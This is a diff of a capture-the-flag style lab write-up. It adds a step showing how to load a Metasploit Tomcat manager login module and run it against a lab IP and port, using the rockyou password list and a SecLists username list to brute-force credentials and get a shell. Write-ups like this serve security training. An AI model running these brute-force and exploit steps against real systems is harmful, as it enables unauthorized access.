@@ -73,7 +73,22 @@ Not all the vulnerabilities are named in the same format.
 
  Already Discovered  
 
-## 10. Use Metasploit to exploit the service and get a shell on the system.
+## 10. Use Metasploit to exploit the service and get a shell on the system. 
+
+Start Metasploit with `:> msfconsole` and conduct a search for Tomcat with `:> search tomcat`. Option 64 is the manager login vulnerability. ` user 64` will load the exploit.  
+
+![Start Metasploit](assets/tools-08.png)
+
+Once the exploit is loaded, `show options` and begin editing the parameters with known information.
+````bash
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set RHOSTS 10.201.108.97
+set RPORT 1234
+set USER_FILE /usr/share/wordlists/SecLists/Usernames/Names/names.txt
+exploit
+````
+![Ready to Exploit](assets/tools-09a.png)
+
 
 ## 11. What user did you get a shell as?
 
